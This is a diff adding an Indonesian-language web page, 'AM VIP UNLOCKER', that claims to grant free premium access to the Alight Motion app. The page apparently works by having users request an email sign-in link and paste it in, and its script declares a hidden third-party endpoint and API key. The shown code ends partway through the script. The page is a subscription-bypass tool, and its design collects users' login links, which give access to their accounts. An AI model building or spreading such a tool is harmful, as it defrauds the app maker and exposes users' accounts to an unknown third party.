@@ -1,0 +1,1340 @@
+<!DOCTYPE html>
+<html lang="id" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alight Motion VIP</title>
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- FontAwesome 6 Pro Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+
+    <!-- Firebase SDK v10 (Compat version for high reliability & error handling) -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Plus Jakarta Sans', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'monospace'],
+                    },
+                    colors: {
+                        vip: {
+                            cyan: '#00f2fe',
+                            purple: '#7f00ff',
+                            amber: '#f59e0b',
+                            emerald: '#10b981',
+                            rose: '#f43f5e',
+                            dark: '#05070f',
+                            card: 'rgba(13, 19, 36, 0.88)'
+                        }
+                    },
+                    boxShadow: {
+                        'vip-glow': '0 0 35px -5px rgba(0, 242, 254, 0.35)',
+                        'purple-glow': '0 0 35px -5px rgba(127, 0, 255, 0.35)',
+                        'emerald-glow': '0 0 25px -5px rgba(16, 185, 129, 0.35)',
+                        'fab-glow': '0 0 30px rgba(127, 0, 255, 0.7)'
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        body {
+            background-color: #05070f;
+            color: #f1f5f9;
+            background-image: 
+                radial-gradient(at 10% 10%, rgba(127, 0, 255, 0.25) 0px, transparent 45%),
+                radial-gradient(at 90% 90%, rgba(0, 242, 254, 0.22) 0px, transparent 45%),
+                radial-gradient(at 50% 50%, rgba(16, 185, 129, 0.12) 0px, transparent 65%);
+            background-attachment: fixed;
+        }
+
+        .glass-card {
+            background: rgba(13, 19, 36, 0.88);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        .step-tab.active {
+            background: linear-gradient(135deg, rgba(0, 242, 254, 0.28), rgba(127, 0, 255, 0.28));
+            border-color: rgba(0, 242, 254, 0.55);
+            color: #ffffff;
+            box-shadow: 0 0 25px rgba(0, 242, 254, 0.25);
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: #05070f; }
+        ::-webkit-scrollbar-thumb { background: #1e293b; border-radius: 6px; }
+        ::-webkit-scrollbar-thumb:hover { background: #00f2fe; }
+
+        /* Floating Chat Box Modes */
+        .chat-floating-window {
+            transition: all 0.35s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        .chat-floating-window.fullscreen-mode {
+            position: fixed !important;
+            inset: 0 !important;
+            width: 100vw !important;
+            height: 100vh !important;
+            max-width: 100vw !important;
+            max-height: 100vh !important;
+            border-radius: 0 !important;
+            z-index: 9999 !important;
+        }
+
+        @keyframes pulse-ring {
+            0% { transform: scale(0.95); opacity: 0.8; }
+            50% { transform: scale(1.15); opacity: 0.3; }
+            100% { transform: scale(0.95); opacity: 0.8; }
+        }
+        .animate-pulse-ring {
+            animation: pulse-ring 2.5s infinite ease-in-out;
+        }
+    </style>
+</head>
+
+<body class="min-h-screen flex flex-col justify-between selection:bg-cyan-500 selection:text-slate-950 font-sans relative pb-20 sm:pb-0">
+
+    <header class="border-b border-slate-800/80 glass-card sticky top-0 z-40">
+        <div class="max-w-6xl mx-auto px-4 h-16 flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <div class="w-10 h-10 rounded-2xl bg-gradient-to-tr from-cyan-500 via-indigo-600 to-purple-600 flex items-center justify-center text-slate-950 font-extrabold text-lg shadow-vip-glow">
+                    <i class="fa-solid fa-crown text-slate-950 text-base"></i>
+                </div>
+                <div>
+                    <h1 class="font-extrabold text-base sm:text-lg tracking-tight bg-gradient-to-r from-cyan-300 via-purple-300 to-emerald-300 bg-clip-text text-transparent">
+                        AM VIP UNLOCKER
+                    </h1>
+                    <p class="text-[10px] sm:text-xs text-slate-400">Permanent</p>
+                </div>
+            </div>
+
+            <!-- Server Status Badge -->
+            <div class="flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/30 px-3.5 py-1.5 rounded-full shadow-emerald-glow">
+                <span class="relative flex h-2.5 w-2.5">
+                    <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                    <span class="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500"></span>
+                </span>
+                <span class="text-xs font-bold text-emerald-400 tracking-wide">Server Online</span>
+            </div>
+        </div>
+    </header>
+
+    <main class="max-w-5xl mx-auto px-4 py-6 w-full flex-grow space-y-6">
+
+        <!-- Live Global Statistics Grid -->
+        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+            <div class="glass-card rounded-2xl p-5 border border-cyan-500/20 flex items-center justify-between shadow-vip-glow">
+                <div class="space-y-1">
+                    <p class="text-xs font-semibold text-slate-400 uppercase tracking-wider">Total AM Premium Berhasil</p>
+                    <h2 id="stat-total-premium" class="text-2xl sm:text-3xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 to-emerald-300 font-mono">
+                        1,250
+                    </h2>
+                </div>
+                <div class="w-12 h-12 rounded-2xl bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-center text-cyan-400 text-xl">
+                    <i class="fa-solid fa-award"></i>
+                </div>
+            </div>
+
+            <div class="glass-card rounded-2xl p-5 border border-purple-500/20 flex items-center justify-between shadow-purple-glow">
+                <div class="space-y-1">
+                    <p class="text-xs font-semibold text-slate-400 uppercase tracking-wider">Status Akses VIP</p>
+                    <h2 class="text-xl sm:text-2xl font-extrabold text-emerald-400 flex items-center gap-2">
+                        <i class="fa-solid fa-shield-halved text-sm"></i> UNLIMITED FREE
+                    </h2>
+                </div>
+                <div class="w-12 h-12 rounded-2xl bg-purple-500/10 border border-purple-500/30 flex items-center justify-center text-purple-400 text-xl">
+                    <i class="fa-solid fa-bolt"></i>
+                </div>
+            </div>
+        </div>
+
+        <!-- 2-Step VIP Activation Section -->
+        <div class="space-y-6">
+            
+            <!-- Step Navigation Tabs -->
+            <div class="grid grid-cols-2 gap-2 bg-slate-950/80 p-1.5 rounded-2xl border border-slate-800/80">
+                <button onclick="switchStep(1)" id="tab-step-1" class="step-tab active py-3.5 px-4 rounded-xl text-xs font-bold transition flex items-center justify-center gap-2 border border-transparent cursor-pointer">
+                    <span class="w-5 h-5 rounded-full bg-cyan-500/20 border border-cyan-400 text-cyan-300 flex items-center justify-center text-[10px]">1</span>
+                    <span>Kirim Link Email</span>
+                </button>
+                <button onclick="switchStep(2)" id="tab-step-2" class="step-tab py-3.5 px-4 rounded-xl text-xs font-bold transition flex items-center justify-center gap-2 border border-transparent cursor-pointer">
+                    <span class="w-5 h-5 rounded-full bg-purple-500/20 border border-purple-400 text-purple-300 flex items-center justify-center text-[10px]">2</span>
+                    <span>Unlock VIP</span>
+                </button>
+            </div>
+
+            <!-- Step 1 Panel: Email Link Request -->
+            <section id="panel-step-1" class="glass-card rounded-3xl p-6 sm:p-8 space-y-6 shadow-vip-glow">
+                <div class="flex items-center gap-3">
+                    <div class="w-10 h-10 rounded-2xl bg-cyan-500/10 border border-cyan-500/30 text-cyan-400 flex items-center justify-center text-base font-bold">
+                        <i class="fa-solid fa-paper-plane"></i>
+                    </div>
+                    <div>
+                        <h2 class="text-base font-bold text-slate-100">Langkah 1: Kirim Link Ke Email</h2>
+                        <p class="text-xs text-slate-400">Masukkan email Alight Motion untuk mengirim autentikasi</p>
+                    </div>
+                </div>
+
+                <form onsubmit="event.preventDefault(); handleSendLink();" class="space-y-4">
+                    <div class="space-y-1.5">
+                        <label class="text-xs font-semibold text-slate-300">Email Alight Motion</label>
+                        <div class="relative">
+                            <input type="email" id="input-email-1" required placeholder="contoh: user@gmail.com" class="w-full bg-slate-950/90 border border-slate-800 rounded-xl pl-10 pr-4 py-3.5 text-xs text-slate-100 font-mono focus:outline-none focus:border-cyan-400 transition">
+                            <i class="fa-solid fa-envelope absolute left-3.5 top-4 text-slate-500 text-xs"></i>
+                        </div>
+                    </div>
+
+                    <button type="submit" id="btn-send-link" class="w-full py-4 bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-slate-950 font-extrabold text-xs rounded-xl transition duration-300 shadow-vip-glow flex items-center justify-center gap-2 cursor-pointer">
+                        <i class="fa-solid fa-paper-plane"></i>
+                        <span>KIRIM LINK KE EMAIL</span>
+                    </button>
+                </form>
+            </section>
+
+            <!-- Step 2 Panel: Unlock Account -->
+            <section id="panel-step-2" class="hidden glass-card rounded-3xl p-6 sm:p-8 space-y-6 shadow-purple-glow">
+                <div class="flex items-center gap-3">
+                    <div class="w-10 h-10 rounded-2xl bg-purple-500/10 border border-purple-500/30 text-purple-400 flex items-center justify-center text-base font-bold">
+                        <i class="fa-solid fa-unlock-keyhole"></i>
+                    </div>
+                    <div>
+                        <h2 class="text-base font-bold text-slate-100">Langkah 2: Selesaikan</h2>
+                        <p class="text-xs text-slate-400">Tempelkan Link Firebase yang dikirim ke email Anda</p>
+                    </div>
+                </div>
+
+                <form onsubmit="event.preventDefault(); handleUnlockVIP();" class="space-y-4">
+                    <div class="space-y-1.5">
+                        <div class="flex items-center justify-between">
+                            <label class="text-xs font-semibold text-slate-300">Email Terhubung</label>
+                            <span class="text-[10px] text-emerald-400 font-medium"><i class="fa-solid fa-circle-check"></i> Terisi Otomatis</span>
+                        </div>
+                        <div class="relative">
+                            <input type="email" id="input-email-2" required placeholder="user@gmail.com" class="w-full bg-slate-950/90 border border-slate-800 rounded-xl pl-10 pr-4 py-3 text-xs text-cyan-300 font-mono focus:outline-none focus:border-purple-400 transition">
+                            <i class="fa-solid fa-user-check absolute left-3.5 top-3.5 text-cyan-400 text-xs"></i>
+                        </div>
+                    </div>
+
+                    <div class="space-y-1.5">
+                        <div class="flex items-center justify-between">
+                            <label class="text-xs font-semibold text-slate-300">Link Firebase Auth</label>
+                            <button type="button" onclick="pasteFirebaseLink()" class="text-[11px] text-purple-400 hover:text-purple-300 font-medium flex items-center gap-1 cursor-pointer">
+                                <i class="fa-regular fa-paste"></i> Tempel Link
+                            </button>
+                        </div>
+                        <textarea id="input-firebase-link" rows="3" required placeholder="Tempelkan link auth Firebase di sini... (https://alight-creative.firebaseapp.com/...)" class="w-full bg-slate-950/90 border border-slate-800 rounded-xl p-3 text-xs text-purple-200 font-mono focus:outline-none focus:border-purple-400 transition leading-relaxed resize-none"></textarea>
+                    </div>
+
+                    <button type="submit" id="btn-unlock-vip" class="w-full py-4 bg-gradient-to-r from-purple-600 via-indigo-600 to-cyan-500 hover:from-purple-500 hover:to-cyan-400 text-white font-extrabold text-xs rounded-xl transition duration-300 shadow-purple-glow flex items-center justify-center gap-2 cursor-pointer">
+                        <i class="fa-solid fa-crown text-amber-300"></i>
+                        <span>PROSES UNLOCK</span>
+                    </button>
+                </form>
+            </section>
+
+            <!-- Result Feedback Card -->
+            <section id="result-card" class="hidden glass-card rounded-3xl p-6 border border-slate-800 space-y-3 transition-all duration-300">
+                <div class="flex items-center justify-between">
+                    <div class="flex items-center gap-2">
+                        <span id="result-badge-icon" class="w-7 h-7 rounded-lg bg-emerald-500/20 text-emerald-400 flex items-center justify-center text-xs">
+                            <i class="fa-solid fa-check"></i>
+                        </span>
+                        <h3 id="result-title" class="font-bold text-sm text-slate-100">Status Respon</h3>
+                    </div>
+                    <button onclick="copyResultText()" class="text-xs text-slate-400 hover:text-cyan-400 flex items-center gap-1 cursor-pointer">
+                        <i class="fa-regular fa-copy"></i> Salin
+                    </button>
+                </div>
+                <div id="result-content" class="p-3.5 bg-slate-950 rounded-2xl border border-slate-800 font-mono text-xs text-cyan-300 overflow-x-auto whitespace-pre-wrap"></div>
+            </section>
+
+            <!-- Persistent Global History Log Card -->
+            <section class="glass-card rounded-3xl p-5 sm:p-6 border border-slate-800 space-y-4">
+                <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+                    <div class="flex items-center gap-2">
+                        <i class="fa-solid fa-list-check text-cyan-400"></i>
+                        <h3 class="text-xs font-bold text-slate-200">Riwayat Global VIP Premium</h3>
+                    </div>
+                    <span class="text-[10px] text-slate-400 bg-slate-900 border border-slate-800 px-2.5 py-1 rounded-full">Realtime Global Database</span>
+                </div>
+
+                <div id="global-history-list" class="space-y-2 max-h-64 overflow-y-auto pr-1">
+                    <div class="text-center py-6 text-xs text-slate-500 animate-pulse">Memuat riwayat global VIP...</div>
+                </div>
+            </section>
+
+        </div>
+
+    </main>
+
+    <div class="fixed bottom-6 right-6 z-50">
+        <button id="btn-fab-chat" onclick="toggleChatWindow()" class="relative w-14 h-14 rounded-full bg-gradient-to-tr from-purple-600 via-indigo-600 to-cyan-500 text-white flex items-center justify-center shadow-fab-glow hover:scale-105 active:scale-95 transition duration-300 cursor-pointer">
+            <i id="fab-icon" class="fa-solid fa-comments text-xl"></i>
+            <span class="absolute -top-1 -right-1 w-3.5 h-3.5 rounded-full bg-emerald-400 border-2 border-slate-950"></span>
+            <span class="absolute inset-0 rounded-full border-2 border-cyan-400/50 animate-pulse-ring pointer-events-none"></span>
+        </button>
+    </div>
+
+    <!-- Chat Modal Window -->
+    <div id="chat-modal-overlay" class="fixed inset-0 bg-slate-950/60 backdrop-blur-sm z-50 hidden opacity-0 transition-opacity duration-300 flex items-end sm:items-center justify-center sm:p-4">
+        
+        <div id="chat-floating-container" class="chat-floating-window glass-card w-full sm:max-w-md h-[88vh] sm:h-[620px] rounded-t-3xl sm:rounded-3xl border border-purple-500/30 flex flex-col shadow-2xl overflow-hidden transform translate-y-full sm:translate-y-8 transition-transform duration-300">
+            
+            <!-- Chat Header -->
+            <div class="flex items-center justify-between p-4 border-b border-slate-800/80 bg-slate-950/70">
+                <div class="flex items-center gap-2.5">
+                    <div class="w-8 h-8 rounded-xl bg-purple-500/20 text-purple-400 flex items-center justify-center text-xs border border-purple-500/30">
+                        <i class="fa-solid fa-comments"></i>
+                    </div>
+                    <div>
+                        <div class="flex items-center gap-1.5">
+                            <h3 class="text-xs font-bold text-slate-100">Komunitas VIP Network</h3>
+                            <button onclick="openNicknameModal()" class="text-[10px] text-cyan-400 hover:text-cyan-300 bg-cyan-950/80 border border-cyan-800 px-2 py-0.5 rounded-lg flex items-center gap-1 cursor-pointer">
+                                <i class="fa-solid fa-pen-to-square"></i> <span id="chat-user-tag">User-****</span>
+                            </button>
+                        </div>
+                        <p class="text-[10px] text-slate-400">Global Chat & Multi-Channel (CH)</p>
+                    </div>
+                </div>
+
+                <div class="flex items-center gap-2">
+                    <!-- Fullscreen Toggle Slider Switch -->
+                    <div class="flex items-center gap-1.5 bg-slate-900 border border-slate-800 px-2 py-1 rounded-xl">
+                        <span class="text-[10px] text-slate-400 font-semibold"><i class="fa-solid fa-expand text-[9px]"></i> Full</span>
+                        <label class="relative inline-flex items-center cursor-pointer">
+                            <input type="checkbox" id="toggle-fullscreen-chat" onchange="toggleFullscreenMode(this.checked)" class="sr-only peer">
+                            <div class="w-7 h-4 bg-slate-800 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-slate-300 after:border after:rounded-full after:h-3 after:w-3 after:transition-all peer-checked:bg-cyan-500"></div>
+                        </label>
+                    </div>
+
+                    <!-- Close Chat Button -->
+                    <button onclick="toggleChatWindow(false)" class="w-7 h-7 rounded-xl bg-slate-900 border border-slate-800 hover:bg-slate-800 text-slate-400 hover:text-rose-400 flex items-center justify-center text-xs transition cursor-pointer">
+                        <i class="fa-solid fa-xmark"></i>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Chat & Channel Mode Selector Tab Bar -->
+            <div class="px-3 pt-2 pb-1 bg-slate-950/90 border-b border-slate-800/80 flex items-center justify-between gap-2">
+                <div class="grid grid-cols-2 gap-1.5 w-full">
+                    <button onclick="switchChatTab('global')" id="tab-btn-global" class="py-1.5 px-3 rounded-xl text-[11px] font-bold border transition flex items-center justify-center gap-1.5 bg-cyan-500/20 border-cyan-400 text-cyan-300">
+                        <i class="fa-solid fa-earth-americas text-[10px]"></i> Global Chat
+                    </button>
+                    <button onclick="switchChatTab('ch')" id="tab-btn-ch" class="py-1.5 px-3 rounded-xl text-[11px] font-bold border transition flex items-center justify-center gap-1.5 bg-slate-900 border-slate-800 text-slate-400 hover:text-slate-200">
+                        <i class="fa-solid fa-hashtag text-[10px]"></i> Channel (CH)
+                    </button>
+                </div>
+            </div>
+
+            <!-- Sub-Channel (CH) Pills Selector Bar -->
+            <div id="channel-pills-bar" class="hidden px-3 py-2 bg-slate-900/90 border-b border-slate-800/80 flex items-center justify-between gap-1.5 overflow-x-auto text-[10px] font-mono whitespace-nowrap">
+                <div class="flex items-center gap-1.5 overflow-x-auto">
+                    <button onclick="selectChannel('general')" id="ch-pill-general" class="ch-pill px-2.5 py-1 rounded-lg bg-purple-500/20 border border-purple-400 text-purple-300 font-bold">#general</button>
+                    <button onclick="selectChannel('preset-am')" id="ch-pill-preset-am" class="ch-pill px-2.5 py-1 rounded-lg bg-slate-950 border border-slate-800 text-slate-400 hover:text-slate-200">#preset-am</button>
+                    <button onclick="selectChannel('pengumuman-owner')" id="ch-pill-pengumuman-owner" class="ch-pill px-2.5 py-1 rounded-lg bg-slate-950 border border-slate-800 text-slate-400 hover:text-slate-200">#pengumuman-owner</button>
+                    <button onclick="selectChannel('vip-lounge')" id="ch-pill-vip-lounge" class="ch-pill px-2.5 py-1 rounded-lg bg-slate-950 border border-slate-800 text-slate-400 hover:text-slate-200">#vip-lounge</button>
+                </div>
+                <div id="ch-owner-badge" class="hidden text-[9px] bg-amber-500/10 border border-amber-500/30 text-amber-300 px-2 py-0.5 rounded-md font-bold flex items-center gap-1 shrink-0">
+                    <i class="fa-solid fa-lock text-[8px]"></i> Read-Only (Kontrol Owner)
+                </div>
+            </div>
+
+            <!-- Freeze Penalty Indicator Bar -->
+            <div id="freeze-indicator-bar" class="hidden p-2.5 bg-amber-950/90 border-b border-amber-800/80 flex items-center justify-between text-xs text-amber-300 font-mono">
+                <span class="flex items-center gap-2">
+                    <i class="fa-solid fa-snowflake animate-spin"></i>
+                    <span>Akses Dibekukan (Freeze):</span>
+                </span>
+                <span id="freeze-timer-display" class="font-bold text-amber-200">00:00</span>
+            </div>
+
+            <!-- Chat Message Scroll Container -->
+            <div id="chat-messages" class="flex-grow p-4 overflow-y-auto space-y-3 text-xs">
+                <div class="text-center py-10 text-slate-500 text-xs animate-pulse">Menghubungkan ke Chat Network...</div>
+            </div>
+
+            <!-- Voice Note Recording Bar -->
+            <div id="vn-recording-bar" class="hidden p-3 bg-rose-950/90 border-t border-rose-800/80 flex items-center justify-between">
+                <div class="flex items-center gap-3">
+                    <span class="relative flex h-3 w-3">
+                        <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-rose-400 opacity-75"></span>
+                        <span class="relative inline-flex rounded-full h-3 w-3 bg-rose-500"></span>
+                    </span>
+                    <span class="text-xs font-bold text-rose-300 font-mono">Merekam Voice Note... <span id="vn-timer">00:00</span></span>
+                </div>
+                <div class="flex items-center gap-2">
+                    <button type="button" onclick="cancelVNRecording()" class="px-2.5 py-1 rounded-lg bg-slate-900 hover:bg-slate-800 text-slate-300 text-[11px] font-semibold cursor-pointer">
+                        Batal
+                    </button>
+                    <button type="button" onclick="stopAndSendVN()" class="px-3 py-1 rounded-lg bg-rose-600 hover:bg-rose-500 text-white text-[11px] font-bold flex items-center gap-1 cursor-pointer">
+                        <i class="fa-solid fa-paper-plane text-[10px]"></i> Kirim
+                    </button>
+                </div>
+            </div>
+
+            <!-- Chat Form Bar -->
+            <form id="chat-form" onsubmit="event.preventDefault(); sendChatMessage();" class="p-3 border-t border-slate-800/80 bg-slate-950/90 flex items-center gap-2">
+                <input type="text" id="chat-input" placeholder="Ketik pesan komunitas VIP..." class="flex-grow bg-slate-900 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs text-slate-100 focus:outline-none focus:border-cyan-400 transition">
+                
+                <button type="button" id="btn-record-vn" onclick="startVNRecording()" class="w-9 h-9 rounded-xl bg-slate-900 border border-slate-800 hover:bg-slate-800 text-cyan-400 flex items-center justify-center text-xs transition shrink-0 cursor-pointer" title="Rekam Voice Note">
+                    <i class="fa-solid fa-microphone"></i>
+                </button>
+
+                <button type="submit" id="btn-send-chat" class="w-9 h-9 rounded-xl bg-gradient-to-r from-purple-600 to-cyan-500 hover:from-purple-500 hover:to-cyan-400 text-slate-950 font-bold text-xs transition flex items-center justify-center shrink-0 cursor-pointer">
+                    <i class="fa-solid fa-paper-plane"></i>
+                </button>
+            </form>
+
+        </div>
+    </div>
+
+    <!-- Nickname Modal -->
+    <div id="nickname-modal" class="fixed inset-0 bg-slate-950/80 backdrop-blur-md z-[60] hidden flex items-center justify-center p-4">
+        <div class="glass-card max-w-sm w-full p-6 rounded-3xl border border-cyan-500/30 space-y-4 shadow-2xl">
+            <div class="flex items-center justify-between">
+                <h3 class="font-bold text-sm text-slate-100 flex items-center gap-2">
+                    <i class="fa-solid fa-id-card text-cyan-400"></i> Ganti Nickname Chat
+                </h3>
+                <button onclick="closeNicknameModal()" class="text-slate-400 hover:text-white text-xs">
+                    <i class="fa-solid fa-xmark"></i>
+                </button>
+            </div>
+            
+            <p class="text-xs text-slate-400">Pilih nama tampilan unik Anda untuk komunitas VIP. Nama 'Owner' dilindungi sistem.</p>
+            
+            <div class="space-y-1.5">
+                <label class="text-[11px] font-semibold text-slate-300">Nickname Baru</label>
+                <input type="text" id="input-custom-nickname" maxlength="20" placeholder="Ketik nama Anda..." class="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs text-cyan-300 font-mono focus:outline-none focus:border-cyan-400">
+            </div>
+
+            <div class="flex items-center justify-end gap-2 pt-2">
+                <button type="button" onclick="closeNicknameModal()" class="px-4 py-2 rounded-xl bg-slate-900 text-slate-400 text-xs font-semibold hover:bg-slate-800">
+                    Batal
+                </button>
+                <button type="button" onclick="saveCustomNickname()" class="px-4 py-2 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-slate-950 text-xs font-extrabold shadow-vip-glow">
+                    Simpan Nickname
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Violation Warning Modal -->
+    <div id="violation-modal" class="fixed inset-0 bg-slate-950/90 backdrop-blur-md z-[100] hidden flex items-center justify-center p-4">
+        <div class="glass-card max-w-md w-full p-6 sm:p-8 rounded-3xl border border-rose-500/50 space-y-5 text-center shadow-2xl">
+            <div class="w-16 h-16 rounded-full bg-rose-500/20 text-rose-400 border border-rose-500/40 flex items-center justify-center text-3xl mx-auto animate-bounce">
+                <i class="fa-solid fa-triangle-exclamation"></i>
+            </div>
+
+            <div class="space-y-2">
+                <h2 class="text-lg font-extrabold text-rose-400 uppercase tracking-tight">PERINGATAN IMPERSONATION!</h2>
+                <p id="violation-message" class="text-xs text-slate-300 leading-relaxed">
+                    Nickname <strong class="text-amber-300 font-mono">'Owner'</strong> hanya dapat digunakan oleh 1 user resmi terverifikasi. Akun Anda dibekukan sementara.
+                </p>
+            </div>
+
+            <div class="p-3 bg-slate-950/80 rounded-2xl border border-slate-800 text-xs font-mono space-y-1">
+                <div class="text-slate-400">Durasi Pembekuan (Freeze):</div>
+                <div id="modal-freeze-timer" class="text-xl font-bold text-amber-400">03:00</div>
+                <div class="text-[10px] text-slate-500">Percobaan berulang akan mengakibatkan BANNED PERMANEN</div>
+            </div>
+
+            <button onclick="closeViolationModal()" class="w-full py-3 bg-rose-600 hover:bg-rose-500 text-white font-extrabold text-xs rounded-xl shadow-lg transition">
+                SAYA MENGERTI
+            </button>
+        </div>
+    </div>
+
+    <!-- Banned Modal -->
+    <div id="banned-modal" class="fixed inset-0 bg-slate-950/95 backdrop-blur-xl z-[200] hidden flex items-center justify-center p-4">
+        <div class="glass-card max-w-md w-full p-8 rounded-3xl border border-rose-600 text-center space-y-6 shadow-2xl">
+            <div class="w-20 h-20 rounded-full bg-rose-600/20 text-rose-500 border border-rose-500 flex items-center justify-center text-4xl mx-auto">
+                <i class="fa-solid fa-ban"></i>
+            </div>
+
+            <div class="space-y-3">
+                <h2 class="text-xl font-black text-rose-500 uppercase tracking-wider">AKUN DIBANNED PERMANEN</h2>
+                <p class="text-xs text-slate-300 leading-relaxed">
+                    Akses Anda ke sistem **Alight Motion VIP & Global Network** telah diblokir secara permanen karena melanggar aturan penggunaan nickname resmi Owner secara berulang.
+                </p>
+            </div>
+
+            <div class="p-4 bg-rose-950/40 rounded-2xl border border-rose-800/60 text-[11px] font-mono text-rose-300 text-left space-y-1">
+                <div>• Status: PERMANENTLY BANNED</div>
+                <div>• Alasan: Impersonation Protection Penalty</div>
+                <div>• Akses: Disabling All API & Community Actions</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast Notification Banner -->
+    <div id="toast" class="fixed bottom-6 left-6 z-50 transform translate-y-20 opacity-0 transition-all duration-300 pointer-events-none">
+        <div class="glass-card border border-cyan-500/40 text-slate-100 px-4 py-3 rounded-2xl shadow-2xl flex items-center gap-3">
+            <i id="toast-icon" class="fa-solid fa-circle-check text-cyan-400 text-base"></i>
+            <div>
+                <div id="toast-title" class="font-bold text-xs">Notifikasi</div>
+                <div id="toast-desc" class="text-[11px] text-slate-400">Proses berhasil dilaksanakan.</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="border-t border-slate-800/80 py-5 text-center text-[11px] text-slate-500">
+        &copy; 2026 Alight Motion VIP Premium Gateway. Real-time Persistent Global Network.
+    </footer>
+
+    <script>
+        // EMBEDDED HIDDEN CREDENTIALS
+        const HIDDEN_BASE_ENDPOINT = 'https://apiz.vsunsee.qzz.io/vsunseeV8/alightmotion';
+        const HIDDEN_API_KEY = 'VsunseeXVANZ';
+
+        // Firebase Realtime Database Fallback Config
+        const firebaseConfig = {
+            databaseURL: "https://am-vip-default-rtdb.firebaseio.com"
+        };
+
+        let db = null;
+        try {
+            if (!firebase.apps.length) {
+                firebase.initializeApp(firebaseConfig);
+            }
+            db = firebase.database();
+        } catch(e) {
+            console.warn("Firebase initialized in fallback local storage mode:", e);
+        }
+
+        // Global State & Persistent Variables
+        let deviceUUID = localStorage.getItem('am_vip_device_uuid');
+        if (!deviceUUID) {
+            deviceUUID = 'DEV-' + Math.random().toString(36).substring(2, 9) + Date.now().toString(36);
+            localStorage.setItem('am_vip_device_uuid', deviceUUID);
+        }
+
+        let customNickname = localStorage.getItem('am_vip_nickname');
+        if (!customNickname) {
+            customNickname = 'User_' + Math.floor(1000 + Math.random() * 9000);
+            localStorage.setItem('am_vip_nickname', customNickname);
+        }
+
+        let violationCount = parseInt(localStorage.getItem('am_vip_violations') || '0');
+        let freezeUntil = parseInt(localStorage.getItem('am_vip_freeze_until') || '0');
+        let isBanned = localStorage.getItem('am_vip_banned') === 'true';
+
+        let activeChatTab = 'global'; // 'global' or 'ch'
+        let activeChannel = 'general'; // Default sub-channel for CH
+        let cachedChatMessages = [];
+
+        // Check Owner Impersonation Helper
+        function isOwnerAttempt(nickname) {
+            if (!nickname) return false;
+            const normalized = nickname.toLowerCase().replace(/[\s\._\-]/g, '');
+            return normalized === 'owner';
+        }
+
+        // DOM Ready Handler
+        document.addEventListener('DOMContentLoaded', () => {
+            updateNicknameDisplay();
+            checkBanAndFreezeStatus();
+            setupRealtimeDataListeners();
+
+            // Synced Email Input Listener
+            const email1 = document.getElementById('input-email-1');
+            if (email1) {
+                email1.addEventListener('input', (e) => {
+                    const email2 = document.getElementById('input-email-2');
+                    if (email2) email2.value = e.target.value.trim();
+                });
+            }
+        });
+
+        function setupRealtimeDataListeners() {
+            // Load Local Data Initially
+            const localStats = localStorage.getItem('am_vip_cached_stats') || '1250';
+            document.getElementById('stat-total-premium').innerText = parseInt(localStats).toLocaleString();
+
+            const localChats = JSON.parse(localStorage.getItem('am_vip_cached_chats') || '[]');
+            cachedChatMessages = localChats;
+            renderChatMessages(cachedChatMessages);
+
+            const localHistory = JSON.parse(localStorage.getItem('am_vip_cached_history') || '[]');
+            renderHistoryList(localHistory);
+
+            // Connect Firebase Listeners if Available
+            if (db) {
+                try {
+                    // 1. Total Unlocks Counter
+                    db.ref('stats/total_unlocks').on('value', (snap) => {
+                        if (snap.exists()) {
+                            const val = snap.val();
+                            document.getElementById('stat-total-premium').innerText = val.toLocaleString();
+                            localStorage.setItem('am_vip_cached_stats', val);
+                        } else {
+                            db.ref('stats/total_unlocks').set(1250);
+                        }
+                    });
+
+                    // 2. Chat Messages Stream
+                    db.ref('chats').limitToLast(50).on('value', (snap) => {
+                        if (snap.exists()) {
+                            const data = snap.val();
+                            const msgList = Object.values(data);
+                            msgList.sort((a,b) => a.timestamp - b.timestamp);
+                            cachedChatMessages = msgList;
+                            localStorage.setItem('am_vip_cached_chats', JSON.stringify(msgList));
+                            renderChatMessages(cachedChatMessages);
+                        }
+                    });
+
+                    // 3. History Logs Stream
